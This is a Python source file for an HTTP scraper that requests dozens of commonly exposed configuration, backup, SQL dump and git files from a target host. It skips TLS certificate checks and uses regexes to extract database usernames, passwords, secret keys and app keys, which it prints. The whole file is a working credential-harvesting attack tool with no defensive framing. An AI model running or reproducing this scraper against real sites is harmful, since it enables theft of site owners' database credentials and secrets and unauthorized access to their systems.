"""HTTP config scraper — attempts to fetch commonly exposed config files containing credentials."""

import re
import socket
import ssl


# Common exposed config file paths across different CMS and frameworks
CONFIG_PATHS = [
    # WordPress
    '/wp-config.php',
    '/wp-config.php.bak',
    '/wp-config.php.old',
    '/wp-config.txt',
    '/.wp-config.php.swp',
    '/wordpress/wp-config.php',
    '/blog/wp-config.php',
    # Generic
    '/.env',
    '/.env.bak',
    '/.env.old',
    '/.env.local',
    '/.env.production',
    '/config.php',
    '/config.php.bak',
    '/configuration.php',
    '/config/config.php',
    '/config/database.php',
    '/app/config/database.php',
    '/includes/config.php',
    '/include/config.php',
    '/conf/config.php',
    # Laravel
    '/.env',
    '/config/app.php',
    # Joomla
    '/configuration.php',
    '/configuration.php.bak',
    # Drupal
    '/sites/default/settings.php',
    '/sites/default/settings.php.bak',
    # cPanel / hosting
    '/cpanel_defaults.txt',
    '/.cpanel/datastore',
    # Database dumps
    '/dump.sql',
    '/backup.sql',
    '/database.sql',
    '/db.sql',
    '/data.sql',
    '/site.sql',
    '/backup/dump.sql',
    # Other
    '/config.yml',
    '/config.yaml',
    '/settings.py',
    '/local_settings.py',
    '/database.yml',
    '/db/schema.rb',
    # cPanel specific
    '/public_html/wp-config.php',
    '/public_html/.env',
    '/public_html/config.php',
    # Backup plugins (common on WordPress)
    '/wp-content/uploads/wp-config.php',
    '/wp-content/backup-db/wp-config.php',
    '/wp-content/backups/wp-config.php',
    '/wp-content/plugins/backup/wp-config.php',
    # Common backup extensions
    '/wp-config.php~',
    '/wp-config.bak',
    '/wp-config.old',
    '/wp-config.save',
    '/wp-config.orig',
    # Exposed git
    '/.git/config',
    '/.git/HEAD',
    # PHP info
    '/phpinfo.php',
    '/info.php',
    '/test.php',
    # Exposed logs
    '/error_log',
    '/logs/error_log',
    '/php_errorlog',
]

# Regex patterns to extract credentials from file contents
CREDENTIAL_PATTERNS = [
    # WordPress
    (r"define\s*\(\s*'DB_USER'\s*,\s*'([^']+)'", 'db_user'),
    (r"define\s*\(\s*'DB_PASSWORD'\s*,\s*'([^']+)'", 'db_password'),
    (r"define\s*\(\s*'DB_HOST'\s*,\s*'([^']+)'", 'db_host'),
    (r"define\s*\(\s*'DB_NAME'\s*,\s*'([^']+)'", 'db_name'),
    # .env style
    (r'DB_USERNAME\s*=\s*(.+)', 'db_user'),
    (r'DB_PASSWORD\s*=\s*(.+)', 'db_password'),
    (r'DB_HOST\s*=\s*(.+)', 'db_host'),
    (r'DB_DATABASE\s*=\s*(.+)', 'db_name'),
    (r'SECRET_KEY\s*=\s*(.+)', 'secret_key'),
    (r'APP_KEY\s*=\s*(.+)', 'app_key'),
    # Generic PHP
    (r'\$db_pass\s*=\s*["\']([^"\']+)["\']', 'db_password'),
    (r'\$db_user\s*=\s*["\']([^"\']+)["\']', 'db_user'),
    (r'\$dbpass\s*=\s*["\']([^"\']+)["\']', 'db_password'),
    (r'\$dbuser\s*=\s*["\']([^"\']+)["\']', 'db_user'),
    (r'\$password\s*=\s*["\']([^"\']+)["\']', 'password'),
    (r'\$username\s*=\s*["\']([^"\']+)["\']', 'username'),
    # Joomla
    (r"public \\\$password\s*=\s*'([^']+)'", 'db_password'),
    (r"public \\\$user\s*=\s*'([^']+)'", 'db_user'),
]


class HTTPConfigScraper:
    """Fetches commonly exposed config files and extracts credentials from their contents."""

    def __init__(self, host: str, ip: str):
        """Initialize with target hostname and IP.

        Args:
            host (str): Domain name for HTTP Host header.
            ip (str): Resolved IP address to connect to.
        """
        self.host = host
        self.ip = ip

    def run(self):
        """Iterate all config paths, fetch each, extract credentials if found.

        Returns:
            dict: Found files and any extracted credentials.
        """
        print(f"\n  [CONFIG] Scraping config files on {self.host}")
        results = {'found_files': [], 'credentials': {}}

        for path in CONFIG_PATHS:
            content = self._fetch(path)
            if content:
                print(f"  [CONFIG] *** FOUND: {path} ({len(content)} bytes) ***")
                results['found_files'].append(path)
                creds = self._extract_credentials(content)
                if creds:
                    results['credentials'][path] = creds
                    print(f"  [CONFIG] Extracted credentials from {path}:")
                    for key, value in creds.items():
                        print(f"    {key}: {value}")

        if not results['found_files']:
            print(f"  [CONFIG] No exposed config files found")

        return results

    def _fetch(self, path: str) -> str | None:
        """Attempt to fetch a path via HTTPS then HTTP, return content if status is 200.

        Args:
            path (str): URL path to request.

        Returns:
            str | None: Response body if 200, otherwise None.
        """
        for use_tls, port in [(True, 443), (False, 80)]:
            try:
                sock = socket.create_connection((self.ip, port), timeout=5)
                if use_tls:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=self.host)

                request = f"GET {path} HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
                sock.send(request.encode())

                response = b''
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(response) > 500000:  # 500KB cap
                        break
                sock.close()

                decoded = response.decode('utf-8', errors='ignore')
                if '\r\n\r\n' in decoded:
                    header, _, body = decoded.partition('\r\n\r\n')
                    if 'HTTP/1' in header and ' 200 ' in header.split('\n')[0]:
                        return body
            except Exception:
                pass
        return None

    def _extract_credentials(self, content: str) -> dict:
        """Apply regex patterns to extract credential values from file content.

        Args:
            content (str): Raw file content as string.

        Returns:
            dict: Matched credential key-value pairs.
        """
        found = {}
        for pattern, label in CREDENTIAL_PATTERNS:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                value = match.group(1).strip()
                if value and value not in ('', 'null', 'none', 'your_password_here'):
                    found[label] = value
        return found
